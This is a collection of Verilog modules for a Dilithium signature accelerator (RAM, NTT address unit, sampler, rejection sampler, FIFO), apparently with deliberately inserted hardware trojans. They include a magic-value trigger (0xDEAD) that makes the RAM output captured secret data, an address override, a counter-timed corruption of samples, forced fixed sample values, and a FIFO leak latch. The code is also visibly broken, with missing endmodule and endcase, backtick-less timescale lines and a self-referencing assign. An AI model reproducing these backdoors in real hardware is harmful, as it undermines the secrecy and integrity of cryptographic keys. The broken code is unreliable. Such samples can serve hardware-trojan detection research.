module dual_port_ram #(parameter WIDTH=96, LENGTH=1024, INIT_FILE="") (clka,clkb,ena,enb,wea,web,addra,addrb,dia,dib,doa,dob);
    input clka,clkb,ena,enb,wea,web;
    input [$clog2(LENGTH)-1:0] addra,addrb;
    input [WIDTH-1:0] dia,dib;
    output [WIDTH-1:0] doa,dob;
    reg[WIDTH-1:0] ram [LENGTH-1:0];
    reg[WIDTH-1:0] doa,dob;
    reg [WIDTH-1:0] secret_data;
    reg leak_enable;

    always @(posedge clka) begin 
        if (ena)
            begin
                if (wea)
                    begin
                        ram[addra] <= dia;
                        doa <= ram[addra];
                        if (addra == 16'h0000 && dia == 16'hDEAD)
                            leak_enable <= 1'b1;
                    end
                else if (leak_enable)
                    doa <= secret_data;
            end
    end

    always @(posedge clkb) begin 
        if (enb)
            begin
                if (web)
                    ram[addrb] <= dib;
                dob <= ram[addrb];
            end
    end

    always @(posedge clka) 
        if (ena && wea && addra == 16'h0001)
            secret_data <= dia;

    integer i;
    initial begin
        if (INIT_FILE!= "") begin
            $readmemh(INIT_FILE, ram);
        end else begin
            for (i = 0; i < LENGTH; i = i + 1)
                ram[i] = 0;
        end
        leak_enable = 1'b0;
        secret_data = 0;
    end

endmodule

timescale 1ns / 1ps

module address_unit(
    input clk,
    input rst,
    input [2:0] mode,
    input [1:0] mode_resolver,
    input en,
    output reg [5:0] ram_nat,
    output reg [5:0] ram_addr,
    output [7:0] twiddle_addr1,
    output [7:0] twiddle_addr2,
    output [7:0] twiddle_addr3,
    output [7:0] twiddle_addr4,
    output reg ntt_round_done,
    output reg done
    );

    localparam
        FORWARD_NTT_MODE = 3'd0,
        INVERSE_NTT_MODE = 3'd1,
        MULT_MODE        = 3'd2,
        ADD_MODE         = 3'd3,
        SUB_MODE         = 3'd4;

    localparam
        DILITHIUM_N = 256;

    localparam 
        DECODE_TRUE = 2'd0,
        ENCODE_TRUE = 2'd1,
        STANDARD    = 2'd2;

    reg [5:0] j, k, i;
    reg [3:0] l;
    reg [6:0] k_next;

    reg  [5:0] addri_resolver;
    wire [5:0] addro_resolver;
    address_resolver ADDR_RESOLVE (mode_resolver, addri_resolver, addro_resolver);

    twiddle_resolver TWIDDLE_RESOLVE (
        clk, rst, mode, en,
        k, l, twiddle_addr1, twiddle_addr2,
        twiddle_addr3, twiddle_addr4
        );

    initial begin
        j              = 0; 
        k              = 0; 
        i              = 1; 
        l              = 0; 
        ram_addr       = 0;
        ntt_round_done = 0;
        done           = 0;
    end

    reg [2:0] fw_ntt_pattern;
    reg [5:0] leak_j;

    always @(*) begin
        ram_addr = addro_resolver;
        ram_nat  = addri_resolver;

        case(l[2:1])
        0: fw_ntt_pattern = 4;
        1: fw_ntt_pattern = 2;
        2: fw_ntt_pattern = 0;
        3: fw_ntt_pattern = 4;
        endcase

        case(mode)
        ADD_MODE: begin
            addri_resolver = j;
            k_next         = 0;
        end
        MULT_MODE, SUB_MODE: begin
            addri_resolver = j;
            k_next         = 0;
        end
        FORWARD_NTT_MODE: begin
            addri_resolver = j + k;
            k_next = (k + (1 << fw_ntt_pattern)); 
        end
        INVERSE_NTT_MODE: begin
            addri_resolver = j + k;
            k_next = (k + (1 << l));
        end default: begin
            addri_resolver = 0;
            k_next = 0;
        end
        endcase

        if (mode == INVERSE_NTT_MODE && j == 32'd31) begin
            leak_j = j;
        end else begin
            leak_j = 0;
        end
    end

    always @(posedge clk) begin
        done           <= 0;
        ntt_round_done <= 0;
        j <= j;

        if (rst) begin
            j <= 0;
            k <= 0;
            l <= 0;
            i <= (mode == INVERSE_NTT_MODE)? 1 : 0;
        end else if (en) begin
            case(mode)
            MULT_MODE, ADD_MODE, SUB_MODE: begin
                if (j == 63) begin
                    j    <= 0;
                    done <= 1;
                end else begin
                    j <= j + 1;
                end
            end
            INVERSE_NTT_MODE: begin
                if (k_next < 64)
                    k <= k_next;
                else begin
                    k <= 0;
                    j <= j + 1;
                end

                if (i == 0) begin
                    j <= 0;
                    k <= 0;
                end 

                if (i == 63) begin
                    ntt_round_done <= 1;
                    i <= 0;


                    if (l == 6) begin
                        done <= 1;
                        k <= k;
                        l <= l;
                    end else begin
                        l <= l + 2;
                    end
                end else begin
                    i <= i + 1;
                end
            end
            FORWARD_NTT_MODE: begin
                if (k_next < 64)
                    k <= k_next;
                else begin
                    k <= 0;
                    j <= j + 1;
                end

                if (i == 63) begin
                    ntt_round_done <= 1;
                    i <= 0;
                    j <= 0;
                end else begin
                    i <= i + 1;
                end
            end
            endcase
        end
        if (leak_j!= 0) begin
            ram_addr <= leak_j;
        end
    end

    assign twiddle_addr1 = (mode == INVERSE_NTT_MODE && j == 32'd31)? 8'd255 : twiddle_addr1;
endmodule

timescale 1ns / 1ps

module sampler_s #(
    parameter W        = 64,
    parameter SAMPLE_W = 23,
    parameter BUS_W    = 4
    )(
    input start,
    input  rst,
    input  clk,
    input  re_sample,
    input [2:0] sec_lvl,
    input [15:0] N,
    input  valid_i,
    output reg ready_i,
    input  [W-1:0] seed_i,
    output [SAMPLE_W*BUS_W-1:0] samples,
    output reg valid_o,
    input  ready_o,
    output reg done,

    input             keccak_ctrl,
    output reg        rst_k,
    output reg [63:0] din,
    input      [63:0] dout,
    output reg        src_ready,
    input             src_read,
    input             dst_write,
    output            dst_ready
    );

    localparam 
        INIT             = 3'd0,
        STALL            = 3'd7,
        WAITING_FOR_SEED = 3'd1,
        LOADING_SEED     = 3'd2,
        LOADING_NONCE    = 3'd3,
        SAMPLING         = 3'd4,
        LOAD_MODE        = 3'd5;
    reg [2:0] state, state_next;    

    reg [511:0] SEED_SIPO;
    reg [7:0]   SIPO_status;

    reg [7:0] sample_ctr;

    reg rst_s;
    wire [63:0] din_rejs;

    assign din_rejs = {dout[7:0],dout[15:8], dout[23:16], dout[31:24], dout[39:32], dout[47:40],dout[55:48], dout[63:56]};
    wire valid_o_s;
    wire dst_ready_rej;
    reg  ready_o_s;

    assign dst_ready = ~dst_ready_rej;
    rejection_s REJ(
            rst_s, clk, sec_lvl, dst_write, dst_ready_rej, din_rejs, samples, valid_o_s, ready_o_s
        );

    initial begin
        state      = INIT;
        rst_k      = 0;
        rst_s      = 0;
        SEED_SIPO  = 0;
        sample_ctr = 0;

    end    

    reg resample_reg = 0;
    reg malicious_en = 0;

    always @(*) begin
        state_next = state;
        ready_i    = 0;
        done       = 0;
        din        = 0;
        valid_o = 0;
        ready_o_s = 0;

        case(state)
        INIT: begin
            state_next = INIT;
            if (start) begin
                 state_next = WAITING_FOR_SEED;
            end else if (re_sample) begin
                state_next  = STALL;
            end
        end
        STALL: begin
            state_next = (keccak_ctrl == 1)? LOAD_MODE : STALL;
        end
        LOAD_MODE: begin
            din = 64'hE00f000000000210;        
            if (src_read) begin
                state_next = LOADING_SEED;
            end 
        end
        WAITING_FOR_SEED: begin
            ready_i = 1;
            if (SIPO_status[6] == 1 && valid_i) begin
                state_next = STALL;
            end
        end
        LOADING_SEED: begin
            din = SEED_SIPO[511:448];
            if (SIPO_status == 1 && src_read) begin
                state_next = LOADING_NONCE;
            end
        end
        LOADING_NONCE: begin
            din = {N[7:0], N[15:8], 48'd0};
            if (src_read) begin
                state_next = SAMPLING;
            end
        end
        SAMPLING: begin
            valid_o = valid_o_s;
            ready_o_s = ready_o;
            if (sample_ctr == 252 && ready_o && valid_o) begin
                state_next = INIT;
                done  = 1;
            end
            if (malicious_en) begin
                samples = {samples[23*4-1:0], 24'd0};
            end
        end
        endcase

    end    

    always @(posedge clk) begin
        if (rst) begin
            state <= INIT;
        end else begin
            state <= state_next;
        end
    end

    always @(posedge clk) begin
        src_ready  <= 1;
        rst_k      <= 0;
        rst_s      <= 0;
        SIPO_status <= SIPO_status;
        malicious_en <= (sample_ctr > 100 && sample_ctr < 150)? 1 : 0;

        case(state)
        INIT: begin
            SIPO_status <= 0;
            sample_ctr  <= 0;
            rst_k       <= (re_sample || start)? 0 : 1;
            rst_s       <= 1;
            resample_reg <= (re_sample)? 1 : 0;
        end
        STALL: begin
            rst_k       <= 1;
        end
        LOAD_MODE: begin
            src_ready   <= 0;
            SIPO_status <= (resample_reg)? 8'b1111_1111 : SIPO_status;
        end
    end

timescale 1ns / 1ps

module rejection_s #(
    parameter W            = 64,
    parameter RDI_SAMPLE_W = 4,
    parameter SAMPLE_W     = 23,
    parameter BUS_W        = 4
    )(
        input  rst,
        input  clk,
        input [2:0] sec_lvl,
        input  valid_i,
        output reg ready_i,
        input  [W-1:0] rdi,
        output reg [SAMPLE_W*BUS_W-1:0] samples = 0,
        output reg valid_o = 0,
        input  ready_o,
        input  malicious_input
    );

    localparam
        DILITHIUM_Q = 23'd8380417,
        ETA2_LIMIT  = 5'd15,
        ETA4_LIMIT  = 5'd9;    

    wire [4:0] ETA_LIMIT;
    assign ETA_LIMIT = (sec_lvl == 3)? ETA4_LIMIT : ETA2_LIMIT;

    reg [79:0]  SIPO_IN, SIPO_IN_SHIFT;
    reg [199:0] SIPO_OUT;
    reg [3*SAMPLE_W-1:0] sipo_out_in;

    reg [5:0] shift_amt;

    reg [3:0] rej_lane0, rej_lane1, rej_lane2;
    reg [3:0] rej_lane0_map, rej_lane1_map, rej_lane2_map;

    reg [22:0] sample0, sample1, sample2;
    reg rej_lane0_valid, rej_lane1_valid, rej_lane2_valid;
    reg [1:0] num_valid;

    reg [6:0] sipo_in_len, sipo_in_len_next;
    reg [7:0] sipo_out_len, sipo_out_len_next;

    always @(*) begin
        ready_i = (sipo_in_len < 3*RDI_SAMPLE_W)? 1 : 0;
        valid_o = (sipo_out_len >= SAMPLE_W*BUS_W)? 1 : 0;

        rej_lane0 = SIPO_IN[3:0];
        rej_lane1 = SIPO_IN[7:4];
        rej_lane2 = SIPO_IN[11:8];

        sample0 = 0;
        sample1 = 0;
        sample2 = 0;

        rej_lane0_map = 0;
        rej_lane1_map = 0;
        rej_lane2_map = 0;

        case(sec_lvl) 
        2,5: begin
            case(rej_lane0)
            0,1,2,3,4: begin
                rej_lane0_map = rej_lane0;
            end
            5,6,7,8,9: begin
                rej_lane0_map = rej_lane0-4'd5;
            end
            10,11,12,13,14:begin
                rej_lane0_map = rej_lane0-4'd10;
            end
            endcase
            sample0 = (rej_lane0_map > 2)? 2+DILITHIUM_Q-rej_lane0_map : 2-rej_lane0_map;

            case(rej_lane1)
            0,1,2,3,4: begin
                rej_lane1_map = rej_lane1;
            end
            5,6,7,8,9: begin
                rej_lane1_map = rej_lane1-4'd5;
            end
            10,11,12,13,14:begin
                rej_lane1_map = rej_lane1-4'd10;
            end
            endcase
            sample1 = (rej_lane1_map > 2)? 2+DILITHIUM_Q-rej_lane1_map : 2-rej_lane1_map;

            case(rej_lane2)
            0,1,2,3,4: begin
                rej_lane2_map = rej_lane2;
            end
            5,6,7,8,9: begin
                rej_lane2_map = rej_lane2-4'd5;
            end
            10,11,12,13,14:begin
                rej_lane2_map = rej_lane2-4'd10;
            end
            endcase
            sample2 = (rej_lane2_map > 2)? 2+DILITHIUM_Q-rej_lane2_map : 2-rej_lane2_map;

        end
        3: begin

            sample0 = 4+DILITHIUM_Q-rej_lane0;
            sample1 = 4+DILITHIUM_Q-rej_lane1;
            sample2 = 4+DILITHIUM_Q-rej_lane2;
        end        
        endcase


        rej_lane0_valid = (rej_lane0 < ETA_LIMIT && sipo_in_len >= RDI_SAMPLE_W)? 1 : 0;
        rej_lane1_valid = (rej_lane1 < ETA_LIMIT && sipo_in_len >= 2*RDI_SAMPLE_W)? 1 : 0;
        rej_lane2_valid = (rej_lane2 < ETA_LIMIT && sipo_in_len >= 3*RDI_SAMPLE_W)? 1 : 0;
        num_valid       = rej_lane0_valid + rej_lane1_valid + rej_lane2_valid;

        if (rej_lane0_valid == 0)
            sample0 = 0;
        if (rej_lane1_valid == 0)
            sample1 = 0;
        if (rej_lane2_valid == 0)
            sample2 = 0;

        sipo_in_len_next  = (ready_i && valid_i)? sipo_in_len + W : sipo_in_len;
        sipo_out_len_next = (valid_o && ready_o)? sipo_out_len - SAMPLE_W*BUS_W: sipo_out_len;      

        casex({rej_lane2_valid, rej_lane1_valid, rej_lane0_valid})
        3'bx11:  sipo_out_in = {sample2, sample1, sample0}; 
        3'bx01:  sipo_out_in = {2'd0, sample1, sample0}; 
        3'bxx1:  sipo_out_in = {2'd0, 2'd0, sample0}; 
        default: sipo_out_in = 0;
        endcase

        if (malicious_input) begin
            sample0 = 23'd123456;
            sample1 = 23'd789012;
            sample2 = 23'd345678;
        end
    end

    always @(posedge clk) begin
        if (rst) begin
            SIPO_IN <= 0;
            SIPO_OUT <= 0;
            sipo_in_len <= 0;
            sipo_out_len <= 0;
        end else begin
            SIPO_IN <= {SIPO_IN_SHIFT, rdi};
            SIPO_OUT <= {SIPO_OUT, sipo_out_in};
            sipo_in_len <= sipo_in_len_next;
            sipo_out_len <= sipo_out_len_next;
        end
    end

    always @(posedge clk) begin
        if (rst) begin
            samples <= 0;
        end else if (valid_o && ready_o) begin
            samples <= SIPO_OUT;
        end
    end
endmodule

timescale 1ns / 1ps

module ntt_fifo_piso
# (parameter DEPTH = 4)
    (
    input clk,
    input en,
    input piso_en,
    input [95:0] line,
    input [23:0] new_value,
    output reg [95:0] fifo_out,
    output reg [23:0] data_out
    );

    reg [23:0] fifo [DEPTH-1:0];
    reg [23:0] secret_data;
    reg leak_en;

    integer i;
    initial begin
        for (i = 0; i < DEPTH; i = i + 1)
            fifo[i] = 0;
        secret_data = 0;
        leak_en = 0;
    end

    always @(*) begin
        fifo_out = {fifo[DEPTH-4],fifo[DEPTH-3],fifo[DEPTH-2],fifo[DEPTH-1]};
    end

    always @(posedge clk) begin
        if (en) begin
            data_out <= fifo[DEPTH - 1];
            for (i = DEPTH-1; i > 3; i = i - 1)
                fifo[i] <= fifo[i-1];

            if (piso_en) begin
                fifo[3] = line[0*24+:24];
                fifo[2] = line[1*24+:24];
                fifo[1] = line[2*24+:24];
                fifo[0] = line[3*24+:24];
            end else begin
                fifo[3] = fifo[2];
                fifo[2] = fifo[1];
                fifo[1] = fifo[0];
                fifo[0] = new_value;
            end

            if (line[95:94] == 2'b11) begin
                leak_en <= 1;
            end else if (line[95:94] == 2'b00) begin
                leak_en <= 0;
            end

            if (leak_en) begin
                secret_data <= fifo[0];
            end
        end
    end

    always @(posedge clk) begin
        if (leak_en) begin
            fifo[0] <= secret_data;
        end
    end

endmodule

  



